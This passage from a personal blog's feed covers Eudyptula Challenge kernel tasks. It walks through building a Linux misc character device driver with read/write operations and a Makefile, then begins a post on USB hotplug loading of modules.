</span></span><span class="line"><span class="cl">  <span class="nf">misc_deregister</span><span class="p">(</span><span class="o">&amp;</span><span class="n">my_misc_device</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">pr_info</span><span class="p">(</span><span class="s">&#34;Exiting from module</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">module_init</span><span class="p">(</span><span class="n">hello_world_init</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nf">module_exit</span><span class="p">(</span><span class="n">hello_world_exit</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nf">MODULE_LICENSE</span><span class="p">(</span><span class="s">&#34;GPL&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nf">MODULE_AUTHOR</span><span class="p">(</span><span class="s">&#34;ayedaemon&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nf">MODULE_DESCRIPTION</span><span class="p">(</span><span class="s">&#34;Eudyptula task6&#34;</span><span class="p">);</span>
</span></span></code></pre></div><p>Compile and load module using below <code>Makefile</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-makefile" data-lang="makefile"><span class="line"><span class="cl"><span class="nv">KDIR</span> <span class="o">:=</span> /lib/modules/<span class="k">$(</span>shell uname -r<span class="k">)</span>/build
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">all</span><span class="o">:</span> <span class="n">clean</span> <span class="n">build</span> <span class="n">install</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">build</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">$(</span>MAKE<span class="k">)</span> -C <span class="k">$(</span>KDIR<span class="k">)</span> <span class="nv">M</span><span class="o">=</span><span class="k">$(</span>PWD<span class="k">)</span> modules
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">clean</span><span class="o">:</span> <span class="n">uninstall</span>
</span></span><span class="line"><span class="cl">    <span class="k">$(</span>MAKE<span class="k">)</span> -C <span class="k">$(</span>KDIR<span class="k">)</span> <span class="nv">M</span><span class="o">=</span><span class="k">$(</span>PWD<span class="k">)</span> clean
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">install</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">    - sudo insmod misc_char_device_driver.ko
</span></span><span class="line"><span class="cl">    sudo lsmod <span class="p">|</span> grep misc_char_device_driver
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">uninstall</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">    - sudo rmmod misc_char_device_driver
</span></span></code></pre></div><p>After compiling the above module and loading it, this will give me a character device in the <code>/dev/</code> directory.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">crw------- 1 root root 10, 122 Sep 17 13:21 /dev/eudyptula
</span></span></code></pre></div><p><img loading="lazy" src="https://media.giphy.com/media/o75ajIFH0QnQC3nCeD/giphy.gif#center" alt=""  />
</p>
<p>We can see that the file is a character type because of the initial <code>c</code> indicator. Also the major number is <code>10</code>, which is the common major number for all misc devices. The minor number in our case is random but if you want feel free to allocate a static one.</p>
<p>When loading and unloading this module, it&rsquo;ll also create some logs because of the <code>pr_info</code> function calls. These logs can be viewed via <code>dmesg | grep misc_char_device_driver</code> command.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">[17543.585039] misc_char_device_driver: Hello from module; Return 0
</span></span><span class="line"><span class="cl">[17583.624421] misc_char_device_driver: Exiting from module
</span></span></code></pre></div><h4 id="adding-file-operations-to-driver">Adding file operations to driver</h4>
<p>Now we have a working character device that just exists but it does not support any file operations at this point. We can add the required file operations using the <code>const struct file_operations *fops</code> member of <code>struct miscdevice</code>. In linux kernel, <code>struct file_operations</code> is defined at <a href="https://elixir.bootlin.com/linux/latest/source/include/linux/fs.h#L1964"><code>linux/fs.h</code> file</a>. There are many file operations that are supported but we only need <code>read</code> and <code>write</code> for now.</p>
<p>Our new code will look something like this</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: GPL-2.0+
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/miscdevice.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/fs.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/module.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/init.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/kernel.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="c1">// message formatting
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#define pr_fmt(fmt) KBUILD_MODNAME &#34;: &#34; fmt
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="c1">// Device name
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#define MISC_DEVICE_NAME &#34;eudyptula&#34;
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Custom read operation
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">static</span> <span class="kt">ssize_t</span> <span class="nf">misc_read</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">filp</span><span class="p">,</span> <span class="kt">char</span> <span class="n">__user</span> <span class="o">*</span><span class="n">buff</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">cnt</span><span class="p">,</span> <span class="kt">loff_t</span> <span class="o">*</span><span class="n">offt</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nf">pr_info</span><span class="p">(</span><span class="s">&#34;Read operation performed</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="n">cnt</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Custom write operation
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">static</span> <span class="kt">ssize_t</span> <span class="nf">misc_write</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">filp</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="n">__user</span> <span class="o">*</span><span class="n">buff</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">cnt</span><span class="p">,</span> <span class="kt">loff_t</span> <span class="o">*</span><span class="n">offt</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nf">pr_info</span><span class="p">(</span><span class="s">&#34;Write operation performed</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">cnt</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Operations structure
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">const</span> <span class="k">struct</span> <span class="n">file_operations</span> <span class="n">misc_fops</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="p">.</span><span class="n">read</span> <span class="o">=</span> <span class="n">misc_read</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="p">.</span><span class="n">write</span> <span class="o">=</span> <span class="n">misc_write</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Misc Device structure
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">static</span> <span class="k">struct</span> <span class="n">miscdevice</span> <span class="n">my_misc_device</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="p">.</span><span class="n">minor</span> <span class="o">=</span> <span class="n">MISC_DYNAMIC_MINOR</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="p">.</span><span class="n">name</span> <span class="o">=</span> <span class="n">MISC_DEVICE_NAME</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="p">.</span><span class="n">fops</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">misc_fops</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Entry point
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">static</span> <span class="kt">int</span> <span class="nf">hello_world_init</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kt">int</span> <span class="n">ret</span> <span class="o">=</span> <span class="nf">misc_register</span><span class="p">(</span><span class="o">&amp;</span><span class="n">my_misc_device</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nf">pr_info</span><span class="p">(</span><span class="s">&#34;Hello from module; Return %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">ret</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="o">-</span><span class="n">EFAULT</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Exit point
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">static</span> <span class="kt">void</span> <span class="nf">hello_world_exit</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">misc_deregister</span><span class="p">(</span><span class="o">&amp;</span><span class="n">my_misc_device</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">pr_info</span><span class="p">(</span><span class="s">&#34;Exiting from module</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">module_init</span><span class="p">(</span><span class="n">hello_world_init</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nf">module_exit</span><span class="p">(</span><span class="n">hello_world_exit</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nf">MODULE_LICENSE</span><span class="p">(</span><span class="s">&#34;GPL&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nf">MODULE_AUTHOR</span><span class="p">(</span><span class="s">&#34;ayedaemon&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nf">MODULE_DESCRIPTION</span><span class="p">(</span><span class="s">&#34;Eudyptula task6&#34;</span><span class="p">);</span>
</span></span></code></pre></div><p>After compiling the above module and loading it, this will provide additional functionality of read and write on the device. This can be tested by reading and writing to the <code>/dev/eudyptula</code> device now.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## Read operation</span>
</span></span><span class="line"><span class="cl">dd <span class="k">if</span><span class="o">=</span>/dev/eudyptula <span class="nv">of</span><span class="o">=</span>/dev/null <span class="nv">count</span><span class="o">=</span><span class="m">1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">## Output in `dmesg`</span>
</span></span><span class="line"><span class="cl"><span class="c1"># [23375.547714] misc_char_device_driver: Read operation performed</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">## Write operation</span>
</span></span><span class="line"><span class="cl">dd <span class="k">if</span><span class="o">=</span>/dev/zero <span class="nv">of</span><span class="o">=</span>/dev/eudyptula <span class="nv">count</span><span class="o">=</span><span class="m">1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">## Output in `dmesg`</span>
</span></span><span class="line"><span class="cl"><span class="c1"># [23353.947901] misc_char_device_driver: Write operation performed</span>
</span></span></code></pre></div><h4 id="userspace---data---kernel-module">Userspace &lt;&ndash;[data]&ndash;&gt; kernel module</h4>
<p>Now it&rsquo;s time for the ultimate move, we have a misc character device driver that supports read and write operations to it, but it actually doesn&rsquo;t send any data from kernel to userland and vice-versa. This is because there is no shared memory where we can simply pass the variables or pointers to the location and do whatever we intend to do it.</p>
<p>Things are a bit different when have to transfer data between a kernel layer and userspace. Complete explaination is out of the scope for this article, but the short version is that the transfer is done with the help of 2 buffers, one on the kernel and other on the userspace. The userspace programs fill data in their buffer and address to that buffer is passed to the kernel. The kernel then uses that buffer to copy data to it&rsquo;s own buffer and with that we are done. <a href="https://stackoverflow.com/questions/8265657/how-does-copy-from-user-from-the-linux-kernel-work-internally">Here is a stackoverflow thread</a> on the same topic.</p>
<p><img loading="lazy" src="https://media.giphy.com/media/fd1TSJqq3b4GI/giphy.gif#center" alt=""  />
</p>
<p>But we need not to worry about all this complexity, for us it&rsquo;ll be as hard as calling the <a href="https://www.kernel.org/doc/htmldocs/kernel-api/API---copy-from-user.html"><code>copy_from_user()</code></a> <sup id="fnref:3"><a href="#fn:3" class="footnote-ref" role="doc-noteref">3</a></sup> and <a href="https://www.kernel.org/doc/htmldocs/kernel-api/API---copy-to-user.html"><code>copy_to_user()</code></a> <sup id="fnref:4"><a href="#fn:4" class="footnote-ref" role="doc-noteref">4</a></sup> function from our kernel module.</p>
<p>With this, our new <code>read</code> and <code>write</code> functions will look something like below:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// Custom read operation
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">static</span> <span class="kt">ssize_t</span> <span class="nf">misc_read</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">filp</span><span class="p">,</span> <span class="kt">char</span> <span class="n">__user</span> <span class="o">*</span><span class="n">buff</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">cnt</span><span class="p">,</span> <span class="kt">loff_t</span> <span class="o">*</span><span class="n">offt</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="kt">char</span> <span class="o">*</span><span class="n">my_id</span> <span class="o">=</span> <span class="s">&#34;ayedaemon</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">my_id_len</span> <span class="o">=</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">my_id</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="nf">pr_info</span><span class="p">(</span><span class="s">&#34;[begin] offt=%ld</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="o">*</span><span class="n">offt</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">offt</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">((</span><span class="n">cnt</span> <span class="o">&lt;</span> <span class="n">my_id_len</span><span class="p">)</span> <span class="o">||</span>                        <span class="c1">// Check the size
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="p">(</span><span class="nf">copy_to_user</span><span class="p">(</span><span class="n">buff</span><span class="p">,</span> <span class="n">my_id</span><span class="p">,</span> <span class="n">my_id_len</span><span class="p">)))</span>       <span class="c1">// Copy to buffer
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="k">return</span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="o">*</span><span class="n">offt</span> <span class="o">+=</span> <span class="n">cnt</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="nf">pr_info</span><span class="p">(</span><span class="s">&#34;[ end ] offt=%ld</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="o">*</span><span class="n">offt</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="n">cnt</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Custom write operation
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">static</span> <span class="kt">ssize_t</span> <span class="nf">misc_write</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">filp</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="n">__user</span> <span class="o">*</span><span class="n">buff</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">cnt</span><span class="p">,</span> <span class="kt">loff_t</span> <span class="o">*</span><span class="n">offt</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="kt">char</span> <span class="o">*</span><span class="n">my_id</span> <span class="o">=</span> <span class="s">&#34;ayedaemon&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">my_id_len</span> <span class="o">=</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">my_id</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="kt">char</span> <span class="n">temp</span><span class="p">[</span><span class="n">my_id_len</span><span class="o">+</span><span class="mi">1</span><span class="p">];</span> <span class="c1">// size = 10; including the null byte
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">((</span><span class="n">cnt</span> <span class="o">!=</span> <span class="n">my_id_len</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="o">||</span>                                 <span class="c1">// Check input size (mainly to prevent overflows)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="p">(</span><span class="nf">copy_from_user</span><span class="p">(</span><span class="n">temp</span><span class="p">,</span> <span class="n">buff</span><span class="p">,</span> <span class="n">my_id_len</span><span class="p">))</span> <span class="o">||</span>              <span class="c1">// Copy 9 bytes from userland
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="p">(</span><span class="nf">strncmp</span><span class="p">(</span><span class="n">temp</span><span class="p">,</span> <span class="n">my_id</span><span class="p">,</span> <span class="n">my_id_len</span><span class="p">)))</span>                      <span class="c1">// finally, compare 9 bytes
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	  <span class="k">return</span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">else</span>
</span></span><span class="line"><span class="cl">	  <span class="k">return</span> <span class="n">cnt</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>In the above code, <code>read</code> function first checks the size of the buffer and then copies the <code>my_id</code> value to userspace buffer. And in <code>write</code> function, we check input size, then copies the data from userspace to <code>temp</code> buffer and then compares the data to be same. There are other things in the code but those are for extra checks, just to make sure the module does not crash.</p>
<p>We can now test the code with our makefile and everything should be as we are expecting it to be.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## Read the value from device</span>
</span></span><span class="line"><span class="cl">cat /dev/eudyptula
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">## Output</span>
</span></span><span class="line"><span class="cl"><span class="c1"># ayedaemon</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">## Write &#34;ayedaemon&#34; to the device</span>
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;ayedaemon&#34;</span> &gt; /dev/eudyptula
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">## Output - No output</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">## Write anything apart from &#34;ayedaemon&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;something&#34;</span> &gt; /dev/eudyptula
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">## Output - Gives error</span>
</span></span><span class="line"><span class="cl"><span class="c1"># bash: echo: write error: Invalid argument</span>
</span></span></code></pre></div><p><img loading="lazy" src="https://media.giphy.com/media/hZj44bR9FVI3K/giphy.gif#center" alt=""  />
</p>
<p>Now we have achieved the goal of this task, let&rsquo;s check the formatting of the code so that it follows the proper coding conventions that linux kernels developers have set.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">./linux/scripts/checkpatch.pl -f misc_char_device_driver.c
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">## Output</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># total: 0 errors, 0 warnings, 99 lines checked</span>
</span></span><span class="line"><span class="cl"><span class="c1"># misc_char_device_driver.c has no obvious style problems and is ready for submission.</span>
</span></span></code></pre></div><h3 id="conclusion">Conclusion</h3>
<p>There are mainly 2 types of device drivers - character and block. But there are also network device drivers which are completely different from the ones we discussed here. This article tries to provide basic introduction to misc character devices and details about how to write your own driver. All the code can be found in the <a href="https://github.com/ayedaemon/eudyptula">github repo here</a> <sup id="fnref:5"><a href="#fn:5" class="footnote-ref" role="doc-noteref">5</a></sup> for you to playaround.</p>
<div class="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn:1">
<p><a href="https://www.oreilly.com/library/view/linux-device-drivers/0596000081/ch03s02.html">https://www.oreilly.com/library/view/linux-device-drivers/0596000081/ch03s02.html</a>&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:2">
<p><a href="https://www.kernel.org/doc/html/latest/admin-guide/devices.html">https://www.kernel.org/doc/html/latest/admin-guide/devices.html</a>&#160;<a href="#fnref:2" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:3">
<p><a href="https://www.kernel.org/doc/htmldocs/kernel-api/API---copy-from-user.html">https://www.kernel.org/doc/htmldocs/kernel-api/API---copy-from-user.html</a>&#160;<a href="#fnref:3" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:4">
<p><a href="https://www.kernel.org/doc/htmldocs/kernel-api/API---copy-to-user.html">https://www.kernel.org/doc/htmldocs/kernel-api/API---copy-to-user.html</a>&#160;<a href="#fnref:4" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:5">
<p><a href="https://github.com/ayedaemon/eudyptula">https://github.com/ayedaemon/eudyptula</a>&#160;<a href="#fnref:5" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
</ol>
</div>
]]></content:encoded>
    </item>
    <item>
      <title>Eudyptula Task5</title>
      <link>https://ayedaemon.github.io/post/2022/06/eudyptula-task-5/</link>
      <pubDate>Wed, 22 Jun 2022 16:14:27 +0530</pubDate>
      <guid>https://ayedaemon.github.io/post/2022/06/eudyptula-task-5/</guid>
      <description>Task 5 for Eudyptula challenge</description>
      <content:encoded><![CDATA[<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">This is Task 05 of the Eudyptula Challenge
</span></span><span class="line"><span class="cl">------------------------------------------
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Yeah, you survived the coding style mess!  Now, on to some &#34;real&#34;
</span></span><span class="line"><span class="cl">things, as I know you are getting bored by these so far.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">So, simple task this time around:
</span></span><span class="line"><span class="cl">  - take the kernel module you wrote for task 01, and modify it so that
</span></span><span class="line"><span class="cl">    when a USB keyboard is plugged in, the module will be automatically
</span></span><span class="line"><span class="cl">    loaded by the correct userspace hotplug tools (which are implemented
</span></span><span class="line"><span class="cl">    by depmod / kmod / udev / mdev / systemd, depending on what distro
</span></span><span class="line"><span class="cl">    you are using.)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Yes, so simple, and yet, it&#39;s a bit tricky.  As a hint, go read chapter
</span></span><span class="line"><span class="cl">14 of the book, &#34;Linux Device Drivers, 3rd edition.&#34;  Don&#39;t worry, it&#39;s
</span></span><span class="line"><span class="cl">free, and online, no need to go buy anything.
</span></span></code></pre></div><h3 id="what-is-usb">What is USB??</h3>
<p>Ofcourse, we know what a USB is!! We use it everyday with our digital devices like pen-drive, external harddisks, chargers, digital camera, keyboard, mice, wifi dongle, etc&hellip;USB devices and connectors are popular with everyone, even with people without any IT background. It is so famous and well known that it has got <a href="https://www.usb.org/">it&rsquo;s own website</a> <sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup> and a <a href="https://en.wikipedia.org/wiki/USB">Wikipedia page</a> <sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup>.</p>
<p>In early days, just before USB appeared, peripherals like keyboards, mouse and printers were connected with serial and parallel ports. Problem with that was if you accidentally stuck a mouse into the socket for keyboard, it won&rsquo;t work. And that&rsquo;s not it, once you successfully connect the device in the correct socket..you now need to install the proper driver for it.</p>
<p>If all went well, a quick reboot after the driver install and you&rsquo;ll have your working device ready to be used. Naturally, people would want something better and easy than this - &ldquo;One port to rule them all&rdquo;</p>
<p><img loading="lazy" src="https://media.giphy.com/media/3ov9jNkYm8QqxakeCQ/giphy.gif#center" alt="usb"  />
</p>
<p>And soon, the USB (Universal Serial Bus) was born as a replacement for the serial, parallel and PS/2 ports.</p>
<p>The USB specification went on to have several revisions, with the major ones being 2.0 in 2001, 3.0 in 2008, and the very latest spec (4.0) released in 2019. Let&rsquo;s take a look at how USBs work.</p>
<h3 id="usb-in-linux">USB in linux</h3>
<p>Linux kernel has a dedicated sub-system to handle USB, you can read everything about it in detail from <a href="http://www.linux-usb.org/USB-guide/book1.html">here</a> <sup id="fnref:3"><a href="#fn:3" class="footnote-ref" role="doc-noteref">3</a></sup></p>
<p>Let me start with a terminal command to begin explaining things. There are utilities that can help you to identify the system hardware&hellip;you can find any device connected to your system, more specifically you can get the USBs attached with <code>lsusb</code> command</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># COMMAND -&gt;   lsusb --tree --verbose
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/:  Bus 01.Port 1: Dev 1, Class=root_hub, Driver=xhci_hcd/6p, 5000M
</span></span><span class="line"><span class="cl">    ID PP01:VV02 Linux Foundation 3.0 root hub
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/:  Bus 02.Port 1: Dev 1, Class=root_hub, Driver=xhci_hcd/12p, 480M
</span></span><span class="line"><span class="cl">    ID PP01:VV01 Linux Foundation 2.0 root hub
</span></span><span class="line"><span class="cl">    |__ Port 1: Dev 2, If 1, Class=Human Interface Device, Driver=usbhid, 12M
</span></span><span class="line"><span class="cl">        ID 046d:c534 Logitech, Inc. Unifying Receiver
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    |__ Port 1: Dev 2, If 0, Class=Human Interface Device, Driver=usbhid, 12M
</span></span><span class="line"><span class="cl">        ID 046d:c534 Logitech, Inc. Unifying Receiver
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    |__ Port 5: Dev 3, If 1, Class=Wireless, Driver=btusb, 12M
